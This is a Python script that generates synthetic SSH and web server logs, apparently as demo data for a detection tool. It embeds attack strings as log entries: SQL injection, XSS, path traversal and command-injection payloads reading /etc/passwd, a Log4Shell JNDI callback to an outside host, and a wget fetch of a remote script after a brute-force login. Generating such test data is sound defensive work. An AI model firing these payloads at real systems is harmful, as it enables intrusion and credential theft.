"""Generate realistic, synthetic demo logs in ``samples/``.

All addresses come from the RFC 5737 documentation ranges (192.0.2.0/24,
198.51.100.0/24, 203.0.113.0/24), so no real host is ever "accused".
The output is deterministic thanks to a fixed seed.

    python scripts/generate_samples.py
"""
from __future__ import annotations

import random
from datetime import datetime, timedelta
from pathlib import Path

OUT = Path(__file__).resolve().parent.parent / "samples"
START = datetime(2026, 10, 10, 0, 0, 0)
rng = random.Random(1337)

BROWSERS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.1 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64; rv:131.0) Gecko/20100101 Firefox/131.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 18_0 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148",
]
PAGES = ["/", "/about", "/blog", "/blog/hello-world", "/blog/securing-ssh", "/contact",
         "/static/app.css", "/static/app.js", "/static/logo.svg", "/projects"]
WORDLIST = ["admin", "backup", "old", "test", "dev", "api", "login", "uploads", "private",
            "db", "tmp", "staging", "panel", "dashboard", "console", "shell", "secret", "logs",
            "cgi-bin/test.cgi", "wp-login.php", "phpmyadmin/", ".env", ".git/config",
            "server-status", "actuator/health", "config.php", "backup.sql", "site.bak"]


def syslog(ts: datetime, program: str, msg: str) -> tuple[datetime, str]:
    return ts, f"{ts:%b} {ts.day:>2} {ts:%H:%M:%S} web01 {program}: {msg}"


def sshd(ts: datetime, msg: str) -> tuple[datetime, str]:
    return syslog(ts, f"sshd[{rng.randint(1000, 65000)}]", msg)


def access(ts: datetime, ip: str, path: str, status: int, ua: str, method: str = "GET") -> tuple[datetime, str]:
    size = rng.randint(200, 48000) if status == 200 else rng.randint(150, 600)
    return ts, f'{ip} - - [{ts:%d/%b/%Y:%H:%M:%S} +0200] "{method} {path} HTTP/1.1" {status} {size} "-" "{ua}"'


def auth_log() -> list[str]:
    entries = []
    # Legitimate admins logging in with keys throughout the day.
    for _ in range(40):
        ts = START + timedelta(seconds=rng.randint(0, 86_000))
        user, ip = rng.choice([("alice", "198.51.100.10"), ("bob", "198.51.100.11"), ("deploy", "198.51.100.20")])
        port = rng.randint(40000, 60000)
        entries.append(sshd(ts, f"Accepted publickey for {user} from {ip} port {port} ssh2: ED25519 SHA256:abc"))
        entries.append(sshd(ts + timedelta(minutes=rng.randint(1, 50)), f"Disconnected from user {user} {ip} port {port}"))
    # A human typo: one failure then success. Must NOT be flagged.
    ts = START + timedelta(hours=9, minutes=2)
    entries.append(sshd(ts, "Failed password for alice from 198.51.100.10 port 50122 ssh2"))
    entries.append(sshd(ts + timedelta(seconds=6), "Accepted password for alice from 198.51.100.10 port 50122 ssh2"))
    # Background noise.
    for minute in range(0, 1440, 15):
        entries.append(syslog(START + timedelta(minutes=minute), f"CRON[{rng.randint(1000, 9999)}]",
                              "pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)"))

    # 1) Loud brute force against root/admin.
    ts = START + timedelta(hours=3, minutes=14)
    for _ in range(300):
        ts += timedelta(seconds=rng.uniform(0.5, 3))
        user = rng.choice(["root", "root", "root", "admin"])
        entries.append(sshd(ts, f"Failed password for {user} from 203.0.113.42 port {rng.randint(30000, 60000)} ssh2"))

    # 2) Slow username enumeration: under the brute-force radar, caught by the enum rule.
    ts = START + timedelta(hours=11)
    for user in ["oracle", "test", "postgres", "ubuntu", "git", "pi", "ftpuser"]:
        ts += timedelta(seconds=90)
        entries.append(sshd(ts, f"Invalid user {user} from 192.0.2.77 port {rng.randint(30000, 60000)}"))
        entries.append(sshd(ts, f"Failed password for invalid user {user} from 192.0.2.77 port {rng.randint(30000, 60000)} ssh2"))

    # 3) Brute force that succeeds: the scenario that should wake someone up.
    ts = START + timedelta(hours=22, minutes=41)
    for _ in range(12):
        ts += timedelta(seconds=rng.uniform(5, 15))
        entries.append(sshd(ts, f"Failed password for deploy from 203.0.113.99 port {rng.randint(30000, 60000)} ssh2"))
    ts += timedelta(seconds=9)
    entries.append(sshd(ts, "Accepted password for deploy from 203.0.113.99 port 51515 ssh2"))
    entries.append(syslog(ts + timedelta(seconds=40), "sudo",
                          "   deploy : TTY=pts/1 ; PWD=/home/deploy ; USER=root ; COMMAND=/usr/bin/wget http://203.0.113.99/x.sh"))

    return [line for _, line in sorted(entries, key=lambda e: e[0])]


def access_log() -> list[str]:
    entries = []
    # Normal visitors.
    for _ in range(900):
        ts = START + timedelta(seconds=rng.randint(0, 86_000))
        ip = f"198.51.100.{rng.randint(30, 250)}"
        page = rng.choice(PAGES)
        status = rng.choices([200, 304, 404], weights=[85, 12, 3])[0]
        entries.append(access(ts, ip, page if status != 404 else "/favicon.ico", status, rng.choice(BROWSERS)))

    # Directory brute force with gobuster. /.git/config is actually exposed (200)!
    ts = START + timedelta(hours=14, minutes=5)
    for word in WORDLIST * 4:
        ts += timedelta(milliseconds=rng.randint(80, 400))
        status = 200 if word == ".git/config" else 404
        entries.append(access(ts, "192.0.2.150", f"/{word}", status, "gobuster/3.6"))

    # SQL injection / XSS with sqlmap.
    ts = START + timedelta(hours=16, minutes=30)
    payloads = [
        "/products?id=1",
        "/products?id=1%27",
        "/products?id=1%20AND%20SLEEP(5)",
        "/products?id=1%20UNION%20ALL%20SELECT%20NULL,username,password%20FROM%20users--",
        "/products?id=-1%27%20OR%20%271%27=%271",
        "/search?q=%3Cscript%3Ealert(document.cookie)%3C/script%3E",
        "/download?file=..%2F..%2F..%2F..%2Fetc%2Fpasswd",
        "/ping?host=127.0.0.1;cat%20/etc/passwd",
    ]
    for payload in payloads:
        ts += timedelta(seconds=rng.randint(1, 4))
        entries.append(access(ts, "203.0.113.200", payload, rng.choice([200, 500, 403]), "sqlmap/1.8.9#stable (https://sqlmap.org)"))

    # Log4Shell probe hidden in the User-Agent.
    ts = START + timedelta(hours=19, minutes=12)
    entries.append(access(ts, "192.0.2.201", "/", 200, "${jndi:ldap://203.0.113.66:1389/Exploit}"))
    entries.append(access(ts + timedelta(seconds=2), "192.0.2.201", "/api/login", 404, "${jndi:ldap://203.0.113.66:1389/Exploit}"))

    # Opportunistic WordPress probe (refused: low severity only).
    ts = START + timedelta(hours=6, minutes=48)
    for path in ["/wp-login.php", "/wp-admin/", "/xmlrpc.php"]:
        ts += timedelta(seconds=3)
        entries.append(access(ts, "198.51.100.66", path, 404, BROWSERS[0]))

    return [line for _, line in sorted(entries, key=lambda e: e[0])]


def main() -> None:
    OUT.mkdir(exist_ok=True)
    for name, lines in [("auth.log", auth_log()), ("access.log", access_log())]:
        (OUT / name).write_text("\n".join(lines) + "\n", encoding="utf-8")
        print(f"wrote {OUT / name} ({len(lines)} lines)")


if __name__ == "__main__":
    main()
